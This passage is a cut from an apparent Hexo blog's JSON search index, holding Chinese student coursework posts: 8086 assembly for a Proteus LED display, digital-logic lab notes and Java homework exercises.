src=\"clip_image002-1585753062049.jpg\" alt=\"img\"></p>\n<h3 id=\"小写转大写\"><a href=\"#小写转大写\" class=\"headerlink\" title=\"小写转大写\"></a>小写转大写</h3><p><img src=\"clip_image004-1585753062050.jpg\" alt=\"img\"></p>\n<h3 id=\"找到ASCII码值最大的\"><a href=\"#找到ASCII码值最大的\" class=\"headerlink\" title=\"找到ASCII码值最大的\"></a>找到ASCII码值最大的</h3><p><img src=\"clip_image006-1585753062051.jpg\" alt=\"img\"></p>\n<h3 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h3><p><img src=\"clip_image008-1585753062051.jpg\" alt=\"img\"></p>\n<h3 id=\"同步时间\"><a href=\"#同步时间\" class=\"headerlink\" title=\"同步时间\"></a>同步时间</h3><p><img src=\"clip_image010-1585753062051.jpg\" alt=\"img\"></p>\n<h3 id=\"结束\"><a href=\"#结束\" class=\"headerlink\" title=\"结束\"></a>结束</h3><p><img src=\"clip_image012-1585753062056.jpg\" alt=\"img\"></p>\n<h1 id=\"实验四-软硬件综合设计\"><a href=\"#实验四-软硬件综合设计\" class=\"headerlink\" title=\"实验四 软硬件综合设计\"></a>实验四 软硬件综合设计</h1><h2 id=\"实验要求-3\"><a href=\"#实验要求-3\" class=\"headerlink\" title=\"实验要求\"></a>实验要求</h2><ol>\n<li><p>安装并学习PROTEUS集成开发仿真平台；</p>\n</li>\n<li><p>使用PROTEUS完成基于8086最小系统的两块8X8 LED游动字符显示屏的软硬件仿真设计。显示内容：本人姓名+学号（英文或汉字均可，显示字模自行设计）</p>\n</li>\n</ol>\n<h2 id=\"实验目的-3\"><a href=\"#实验目的-3\" class=\"headerlink\" title=\"实验目的\"></a>实验目的</h2><p>综合8086/8088CPU总线技术、存储器扩展、输入输出、微机系统常用芯片以及汇编语言编程等内容，综合检验课程学习掌握状况。</p>\n<h2 id=\"实验内容-3\"><a href=\"#实验内容-3\" class=\"headerlink\" title=\"实验内容\"></a>实验内容</h2><h3 id=\"proteus仿真电路图\"><a href=\"#proteus仿真电路图\" class=\"headerlink\" title=\"proteus仿真电路图**\"></a>proteus仿真电路图**</h3><p><img src=\"clip_image002-1585753322496.jpg\" alt=\"img\"></p>\n<h3 id=\"所用器件\"><a href=\"#所用器件\" class=\"headerlink\" title=\"所用器件\"></a>所用器件</h3><p><img src=\"clip_image004-1585753322497.jpg\" alt=\"img\"></p>\n<h3 id=\"结果截图\"><a href=\"#结果截图\" class=\"headerlink\" title=\"结果截图\"></a>结果截图</h3><p>显示“518”</p>\n<p><img src=\"clip_image006-1585753322499.jpg\" alt=\"img\"></p>\n<h3 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data1 segment</span><br><span class=\"line\">    data0 db 0ffh,0ffh,01h,0ffh,0ffh,    0ffh,61h,06dh,0dh,0ffh,    0ffh,0ffh,01h,0ffh,0ffh,    0ffh,01h,06dh,01h,0ffh,   0ffh,01h,07dh,01h,0ffh,    0ffh,0ffh,01h,0ffh,0ffh,   0ffh,0ffh,01h,0ffh,0ffh,     0ffh,01h,07dh,01h,0ffh,  0ffh,01h,07dh,01h,0ffh,   0ffh,61h,06dh,01h,0ffh,  0ffh,0fdh,0fdh,01h,0ffh,          0fbh,0efh,0bfh,0efh,0bfh,0efh,0fbh,     0ffh,0c3h,0dbh,0dbh,0c3h,0bfh,0ffh,     0ffh,0c3h,0fbh,0fbh,0c3h,0ffh,0ffh,     0ffh,0ffh,047h,057h,007h,0ffh,0ffh,     0ffh,0f7h,08fh,0f7h,0f7h,0ffh,0ffh,     0ffh,087h,0bfh,0bfh,087h,0ffh,0ffh,     0ffh,0ffh,08bh,0ffh,0ffh,0ffh,0ffh </span><br><span class=\"line\">data1 ends                     ;define the data that will be displayed</span><br><span class=\"line\"></span><br><span class=\"line\">stack1 segment</span><br><span class=\"line\">    db 10 dup(0)</span><br><span class=\"line\">stack1 ends</span><br><span class=\"line\"></span><br><span class=\"line\">code1 segment</span><br><span class=\"line\">    assume cs:code1,ds:data1,ss:stack1</span><br><span class=\"line\">    start:</span><br><span class=\"line\">        mov ax,data1</span><br><span class=\"line\">        mov ds,ax            </span><br><span class=\"line\">        mov bx,offset data0</span><br><span class=\"line\">        mov ds:[100h],02h</span><br><span class=\"line\">         </span><br><span class=\"line\">         </span><br><span class=\"line\">        s1:</span><br><span class=\"line\">            mov cx,0ffh</span><br><span class=\"line\">        s2:</span><br><span class=\"line\">            mov ds:[102h],cx</span><br><span class=\"line\">            mov bp,bx</span><br><span class=\"line\">            mov cx,08h</span><br><span class=\"line\">            mov al,1h</span><br><span class=\"line\">            again1:</span><br><span class=\"line\">                mov dx,0000h</span><br><span class=\"line\">                mov ah,[bp]</span><br><span class=\"line\">                inc bp</span><br><span class=\"line\">                out dx,ax  </span><br><span class=\"line\">                mul ds:[100h]</span><br><span class=\"line\">                loop again1 </span><br><span class=\"line\">                   </span><br><span class=\"line\">        mov cx,08h </span><br><span class=\"line\">        mov al,1h</span><br><span class=\"line\">        </span><br><span class=\"line\">        again2:</span><br><span class=\"line\">            mov dx,0004h</span><br><span class=\"line\">            mov ah,[bp]</span><br><span class=\"line\">            inc bp</span><br><span class=\"line\">            out dx,ax  </span><br><span class=\"line\">            mul ds:[100h]</span><br><span class=\"line\">            loop again2 </span><br><span class=\"line\">        mov ax,00h</span><br><span class=\"line\">        out dx,ax</span><br><span class=\"line\">        mov cx,ds:[102h]</span><br><span class=\"line\">        loop s2</span><br><span class=\"line\">        inc bx</span><br><span class=\"line\">        jmp s1</span><br><span class=\"line\">        </span><br><span class=\"line\">code1 ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>","categories":["技术"],"tags":["微机原理"]},{"title":"电子线路实验上机作业","url":"https://littleghost2016.github.io/2017/03/30/电子线路实验上机作业/","content":"<h1 id=\"实验2-组合逻辑电路部件实验\"><a href=\"#实验2-组合逻辑电路部件实验\" class=\"headerlink\" title=\"实验2 组合逻辑电路部件实验\"></a>实验2 组合逻辑电路部件实验</h1><h2 id=\"实验目的\"><a href=\"#实验目的\" class=\"headerlink\" title=\"实验目的\"></a>实验目的</h2><p>掌握逻辑电路设计的基本方法</p>\n<p>掌握EDA工具MAX-PlusII的原理图输入方法</p>\n<p>掌握MAX-PlusII的逻辑电路编译、波形仿真的方法</p>\n<p>输入设计的电路图；建立相应仿真波形文件，并进行波形仿真</p>\n<p>记录波形和输入与输出的时延差；分析设计电路的正确性</p>\n<h2 id=\"3-8-译码器\"><a href=\"#3-8-译码器\" class=\"headerlink\" title=\"3-8 译码器\"></a>3-8 译码器</h2><h3 id=\"波形图\"><a href=\"#波形图\" class=\"headerlink\" title=\"波形图\"></a>波形图</h3><p><img src=\"clip_image002.jpg\" alt=\"img\"></p>\n<h2 id=\"4位二进制加法器\"><a href=\"#4位二进制加法器\" class=\"headerlink\" title=\"4位二进制加法器\"></a>4位二进制加法器</h2><p>实验内容：用D触发器实现4位二进制加法器，用仿真软件仿真，观察波形图</p>\n<p>实验仪器：D触发器</p>\n<p><img src=\"clip_image004.jpg\" alt=\"img\"></p>\n<p>图中Ａ和Ｂ是用来相加的两n位输入信号，Ｃn-1，Ｓn-1，Ｓn-2，……Ｓ2,Ｓ1,Ｓ0是它们的和。</p>\n<p>在该电路中对Ａ0和Ｂ0相加是用一个半加器，对其它位都用全加器。</p>\n<p>如果需要串接这些电路以增加相加的位数，那么它的第一级也必须是一个全加器。</p>\n<p>利用1位二进制全加器构成一个4位二进制全加器</p>\n<p><img src=\"clip_image006.jpg\" alt=\"IMG_256\"></p>\n<p><img src=\"clip_image008.jpg\" alt=\"img\"></p>\n<h2 id=\"四选一数据选择器\"><a href=\"#四选一数据选择器\" class=\"headerlink\" title=\"四选一数据选择器\"></a>四选一数据选择器</h2><p>实验内容：用与门、或门、非门设计四选一数据选择器，用仿真软件仿真，观察波形图</p>\n<p>实验仪器：与门、或门、非门</p>\n<p>数据选择器又称输入多路选择器、多路开关。它的功能是在选择信号的控制下，</p>\n<p>从若干路输入数据中选择某一路输入数据作为输出。</p>\n<p><img src=\"clip_image010.gif\" alt=\"img\"></p>\n<p><img src=\"clip_image012.jpg\" alt=\"img\"></p>\n<p><img src=\"clip_image014.jpg\" alt=\"img\"></p>\n<h1 id=\"实验3-时序电路设计\"><a href=\"#实验3-时序电路设计\" class=\"headerlink\" title=\"实验3 时序电路设计\"></a>实验3 时序电路设计</h1><h2 id=\"D触发器、JK触发器\"><a href=\"#D触发器、JK触发器\" class=\"headerlink\" title=\"D触发器、JK触发器\"></a>D触发器、JK触发器</h2><p>实验目的：</p>\n<p>1．掌握D触发器、JK触发器的工作原理。</p>\n<p>2．学会正确使用D触发器、JK触发器。</p>\n<p>3.学习利用EDA工具设计简单时序电路。</p>\n<p>4.掌握简单时序电路的分析、设计、波形仿真、器件编程及测试方法</p>\n<p>JK触发器JKFF（或双JK触发器74LS73、74LS76中一个JK触发器）功能测试与分析。</p>\n<p>JK触发器输入端口CLR是复位端，PRN是置位端，CLKS是时钟。给出CK，J，K的波形，</p>\n<p>仿真JK触发器的功能，说明JK触发器的CLK何时有效。</p>\n<p>D触发器74LS74是上升沿触发，JK触发器74LS73是下降沿触发</p>\n<p><img src=\"clip_image016.jpg\" alt=\"img\">     JK触发器波形图</p>\n<p><img src=\"clip_image018.jpg\" alt=\"img\"></p>\n<p>D触发器DFF（或双D触发器74LS74中一个D触发器）功能测试。</p>\n<p>D触发器的输入端口CLR是复位或清零，PRN是（置位）；给定D（数据）、CLK（时钟）波形序列，</p>\n<p>进行波形仿真，记录输入与输出Q波形。说明D触发器是电平触发还是上升沿触发，分析原因。</p>\n<p><img src=\"clip_image020.jpg\" alt=\"IMG_256\"></p>\n<h1 id=\"实验4基于VHDL的基本逻辑电路设计\"><a href=\"#实验4基于VHDL的基本逻辑电路设计\" class=\"headerlink\" title=\"实验4基于VHDL的基本逻辑电路设计\"></a>实验4基于VHDL的基本逻辑电路设计</h1><p>实验目的：</p>\n<pre><code>学会使用VHDL语言设计数字单元电路的方法。\n\n掌握用VHDL语言设计的数字单元电路的调试，波形仿真的方法。</code></pre><h2 id=\"BCD码加法器\"><a href=\"#BCD码加法器\" class=\"headerlink\" title=\"BCD码加法器\"></a>BCD码加法器</h2><p><img src=\"clip_image022.jpg\" alt=\"img\"></p>\n<h2 id=\"波形图-1\"><a href=\"#波形图-1\" class=\"headerlink\" title=\"波形图\"></a>波形图</h2><p><img src=\"clip_image024.jpg\" alt=\"img\"></p>\n<h1 id=\"实验五-数字钟设计\"><a href=\"#实验五-数字钟设计\" class=\"headerlink\" title=\"实验五 数字钟设计\"></a>实验五 数字钟设计</h1><p>实验目的：利用实验系统的资源，对设计的电路进行组装和功能检测。</p>\n<p>设计一个四兆分频器，十进制计数器，BCD-7段译码器，利用实验系统的资源，</p>\n<p>对设计的电路进行组装和功能检测。</p>\n<h2 id=\"10秒计时器\"><a href=\"#10秒计时器\" class=\"headerlink\" title=\"10秒计时器\"></a>10秒计时器</h2><p><img src=\"clip_image026.jpg\" alt=\"IMG_256\"></p>\n<h2 id=\"数字钟\"><a href=\"#数字钟\" class=\"headerlink\" title=\"数字钟\"></a>数字钟</h2><p>实验目的：充分利用实验系统提供的硬件资源，用VHDL语言（或组合逻辑图像结合）</p>\n<p>设计一个分（两位）、秒（两位）计时器。</p>\n<p>包括分频器、变速部分、降速部分、数据选择部分、数字显示部分</p>\n<p><img src=\"clip_image028.jpg\" alt=\"IMG_0194\"></p>\n<p><img src=\"clip_image030.jpg\" alt=\"IMG_0197\"></p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><p>最近在整理以前做过的东西，现在看来基本什么都不记得了，只记得最后一张图里不是我的手，应该是位女同学的，当时互相偷，就硬偷…进行实验的电脑上都带着病毒，然后大家拷贝回来的PPT沾满了毒hhh，回来插自己电脑上很多都中招了…20200331_2302，我刚把那个PPT文件夹给删除了嘻嘻。</p>\n<p>本科这四年的时光好快，现在很是感慨。</p>\n","categories":["技术"],"tags":["电子线路"]},{"title":"Java作业整理","url":"https://littleghost2016.github.io/2017/01/07/Java作业整理/","content":"<h1 id=\"课后题\"><a href=\"#课后题\" class=\"headerlink\" title=\"课后题\"></a>课后题</h1><h2 id=\"2-3\"><a href=\"#2-3\" class=\"headerlink\" title=\"2-3\"></a>2-3</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work3</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">double</span>[] b=&#123;<span class=\"number\">1</span>,-<span class=\"number\">2</span>,+<span class=\"number\">0</span>,-<span class=\"number\">0</span>,Double.POSITIVE_INFINITY,Double.NEGATIVE_INFINITY,Double.NaN&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">double</span>[][] a=<span class=\"keyword\">new</span> <span class=\"keyword\">double</span>[<span class=\"number\">7</span>][<span class=\"number\">7</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">6</span>;i++)</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;=<span class=\"number\">6</span>;j++)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    a[i][j]=b[i]/b[j];</span><br><span class=\"line\">                    System.out.print(a[i][j]+<span class=\"string\">\"      \"</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(j==<span class=\"number\">6</span>)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        System.out.print(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-17\"><a href=\"#2-17\" class=\"headerlink\" title=\"2-17\"></a>2-17</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work17</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a=&#123;<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">23</span>,<span class=\"number\">78</span>,<span class=\"number\">2</span>,<span class=\"number\">345</span>,<span class=\"number\">90098</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">90098</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> min=<span class=\"number\">0</span>,min_value=<span class=\"number\">0</span>,i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(;i&lt;a.length;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[i]&gt;min_value)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    min_value=a[i];</span><br><span class=\"line\">                    min=i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[i]==min_value)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"The min is NO.\"</span>+min+<span class=\"string\">\" : \"</span>+min_value);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Attention please:The array is began with \\\"0\\\"\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-18\"><a href=\"#2-18\" class=\"headerlink\" title=\"2-18\"></a>2-18</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work18</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[][] array=&#123;&#123;<span class=\"number\">99</span>,<span class=\"number\">22</span>,<span class=\"number\">639</span>,<span class=\"number\">15</span>,<span class=\"number\">66</span>,<span class=\"number\">19</span>&#125;,&#123;<span class=\"number\">17</span>,<span class=\"number\">85</span>,<span class=\"number\">56</span>,<span class=\"number\">535</span>,<span class=\"number\">89</span>,<span class=\"number\">76</span>&#125;,&#123;<span class=\"number\">56</span>,<span class=\"number\">67</span>,<span class=\"number\">71</span>,<span class=\"number\">51</span>,<span class=\"number\">24</span>,<span class=\"number\">873</span>&#125;,&#123;<span class=\"number\">821</span>,<span class=\"number\">61</span>,<span class=\"number\">83</span>,<span class=\"number\">17</span>,<span class=\"number\">24</span>,<span class=\"number\">78</span>&#125;,&#123;<span class=\"number\">2</span>,<span class=\"number\">232</span>,<span class=\"number\">87</span>,<span class=\"number\">95</span>,<span class=\"number\">68</span>,<span class=\"number\">49</span>&#125;,&#123;<span class=\"number\">25</span>,<span class=\"number\">90</span>,<span class=\"number\">869</span>,<span class=\"number\">92</span>,<span class=\"number\">93</span>,<span class=\"number\">25</span>&#125;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] sum=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">6</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span> max=<span class=\"number\">0</span>,max_value=<span class=\"number\">0</span>,i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(;i&lt;array[<span class=\"number\">0</span>].length;i++)</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(;j&lt;array[<span class=\"number\">0</span>].length;j++)</span><br><span class=\"line\">                sum[i]=sum[i]+array[i][j];</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;array[<span class=\"number\">0</span>].length;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(sum[i]&gt;max)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    max_value=sum[i];</span><br><span class=\"line\">                    max=i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(sum[i]==max_value)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"The max sum_value(\"</span>+max_value+<span class=\"string\">\") is in the Line.\"</span>+max);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-19\"><a href=\"#2-19\" class=\"headerlink\" title=\"2-19\"></a>2-19</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work19</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">4</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">1000</span>,j=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(;i&lt;<span class=\"number\">10000</span>;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            a[<span class=\"number\">0</span>]=i/<span class=\"number\">1000</span>;</span><br><span class=\"line\">            a[<span class=\"number\">1</span>]=(i-a[<span class=\"number\">0</span>]*<span class=\"number\">1000</span>)/<span class=\"number\">100</span>;</span><br><span class=\"line\">            a[<span class=\"number\">2</span>]=(i-a[<span class=\"number\">0</span>]*<span class=\"number\">1000</span>-a[<span class=\"number\">1</span>]*<span class=\"number\">100</span>)/<span class=\"number\">10</span>;</span><br><span class=\"line\">            a[<span class=\"number\">3</span>]=i-a[<span class=\"number\">0</span>]*<span class=\"number\">1000</span>-a[<span class=\"number\">1</span>]*<span class=\"number\">100</span>-a[<span class=\"number\">2</span>]*<span class=\"number\">10</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((a[<span class=\"number\">0</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">1</span>])*(a[<span class=\"number\">2</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">3</span>])==i||(a[<span class=\"number\">1</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">0</span>])*(a[<span class=\"number\">2</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">3</span>])==i||(a[<span class=\"number\">0</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">1</span>])*(a[<span class=\"number\">3</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">2</span>])==i||(a[<span class=\"number\">1</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">0</span>])*(a[<span class=\"number\">3</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">2</span>])==i)</span><br><span class=\"line\">                System.out.println(i);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((a[<span class=\"number\">0</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">2</span>])*(a[<span class=\"number\">1</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">3</span>])==i||(a[<span class=\"number\">2</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">0</span>])*(a[<span class=\"number\">1</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">3</span>])==i||(a[<span class=\"number\">0</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">2</span>])*(a[<span class=\"number\">3</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">1</span>])==i||(a[<span class=\"number\">2</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">0</span>])*(a[<span class=\"number\">3</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">1</span>])==i)</span><br><span class=\"line\">                System.out.println(i);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((a[<span class=\"number\">0</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">3</span>])*(a[<span class=\"number\">1</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">2</span>])==i||(a[<span class=\"number\">3</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">0</span>])*(a[<span class=\"number\">1</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">2</span>])==i||(a[<span class=\"number\">0</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">3</span>])*(a[<span class=\"number\">2</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">1</span>])==i||(a[<span class=\"number\">3</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">0</span>])*(a[<span class=\"number\">2</span>]*<span class=\"number\">10</span>+a[<span class=\"number\">1</span>])==i)</span><br><span class=\"line\">                System.out.println(i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-2\"><a href=\"#3-2\" class=\"headerlink\" title=\"3-2\"></a>3-2</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work2</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        NewRectangle a=<span class=\"keyword\">new</span> NewRectangle();</span><br><span class=\"line\">        a.Initialize(<span class=\"number\">3</span>,<span class=\"number\">4</span>);</span><br><span class=\"line\">        a.getArea(<span class=\"number\">3</span>,<span class=\"number\">4</span>);</span><br><span class=\"line\">        a.getPerimeter(<span class=\"number\">3</span>,<span class=\"number\">4</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NewRectangle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> width,height;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Initialize</span><span class=\"params\">(<span class=\"keyword\">double</span> width,<span class=\"keyword\">double</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.width=width;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.height=height;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"width initialize:\"</span>+<span class=\"keyword\">this</span>.width+<span class=\"string\">'\\n'</span>+<span class=\"string\">\"height initialize:\"</span>+<span class=\"keyword\">this</span>.height+<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">getArea</span><span class=\"params\">(<span class=\"keyword\">double</span> width,<span class=\"keyword\">double</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"The area is:\"</span>+width*height+<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">getPerimeter</span><span class=\"params\">(<span class=\"keyword\">double</span> width,<span class=\"keyword\">double</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"The perimeter is:\"</span>+<span class=\"number\">2</span>*(width+height));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><em>3-2和3-3中有重复的类NewRectan，会相互覆盖…</em></p>\n<h2 id=\"3-3\"><a href=\"#3-3\" class=\"headerlink\" title=\"3-3\"></a>3-3</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work3</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        NewRectangle a=<span class=\"keyword\">new</span> NewRectangle();</span><br><span class=\"line\">        a.Initialize(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        a.set(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">        Point b=<span class=\"keyword\">new</span> Point();</span><br><span class=\"line\">        b.Initialize(<span class=\"number\">6</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">        System.out.println(a.bPointIn(b));</span><br><span class=\"line\">        Rectangle c=<span class=\"keyword\">new</span> Rectangle();</span><br><span class=\"line\">        c.Initialize(<span class=\"number\">10</span>,<span class=\"number\">10</span>,<span class=\"number\">10</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\">        System.out.println(a.bRectangleIn(c));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NewRectangle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> width,height;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Initialize</span><span class=\"params\">(<span class=\"keyword\">double</span> width,<span class=\"keyword\">double</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.width=width;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.height=height;</span><br><span class=\"line\">        <span class=\"comment\">//System.out.println(\"width 